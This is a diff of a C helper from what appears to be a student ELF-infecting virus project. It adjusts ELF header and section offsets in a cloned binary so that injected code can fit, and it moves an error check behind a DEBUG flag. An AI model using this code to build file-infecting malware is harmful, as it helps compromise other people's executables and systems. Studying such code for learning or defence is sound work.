@@ -1,18 +1,6 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   adjust_references.c                                :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2019/05/13 14:56:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/26 23:28:30 by anselme          ###   ########.fr       */
-/*                                                                            */
-/* ************************************************************************** */
 
-#include "accessors.h"
-#include "errors.h"
 #include "virus.h"
+#include "errors.h"
 
 struct		closure_data
 {
@@ -54,7 +42,8 @@ static bool	shift_shdr_position(struct safe_ptr ref, size_t offset, void *data)
 	return true;
 }
 
-static void	adjust_phdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amount, size_t end_of_last_section)
+static void	adjust_phdr_table_offset(Elf64_Ehdr *safe_elf_hdr, \
+			size_t shift_amount, size_t end_of_last_section)
 {
 	Elf64_Off	e_phoff = safe_elf_hdr->e_phoff;
 
@@ -65,7 +54,8 @@ static void	adjust_phdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amou
 	safe_elf_hdr->e_phoff = e_phoff;
 }
 
-static void	adjust_shdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amount, size_t end_of_last_section)
+static void	adjust_shdr_table_offset(Elf64_Ehdr *safe_elf_hdr, \
+			size_t shift_amount, size_t end_of_last_section)
 {
 	Elf64_Off	e_shoff = safe_elf_hdr->e_shoff;
 
@@ -76,7 +66,8 @@ static void	adjust_shdr_table_offset(Elf64_Ehdr *safe_elf_hdr, size_t shift_amou
 	safe_elf_hdr->e_shoff = e_shoff;
 }
 
-bool		adjust_references(struct safe_ptr ref, size_t shift_amount, size_t end_of_last_section)
+bool		adjust_references(struct safe_ptr clone_ref, \
+			size_t shift_amount, size_t end_of_last_section)
 {
 	struct closure_data	scope;
 
@@ -86,16 +77,16 @@ bool		adjust_references(struct safe_ptr ref, size_t shift_amount, size_t end_of_
 	scope.shift_amount        = shift_amount;
 	scope.end_of_last_section = end_of_last_section;
 
-	Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
-
+	Elf64_Ehdr	*elf_hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));
+#ifdef DEBUG
 	if (elf_hdr == NULL) return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);
-
+#endif
 	adjust_phdr_table_offset(elf_hdr, shift_amount, end_of_last_section);
 	adjust_shdr_table_offset(elf_hdr, shift_amount, end_of_last_section);
 
-	if (!foreach_phdr(ref, shift_phdr_position, &scope))
+	if (!foreach_phdr(clone_ref, shift_phdr_position, &scope))
 		return errors(ERR_THROW, _ERR_ADJUST_REFERENCES);
-	if (!foreach_shdr(ref, shift_shdr_position, &scope))
+	if (!foreach_shdr(clone_ref, shift_shdr_position, &scope))
 		return errors(ERR_THROW, _ERR_ADJUST_REFERENCES);
 
 	return true;
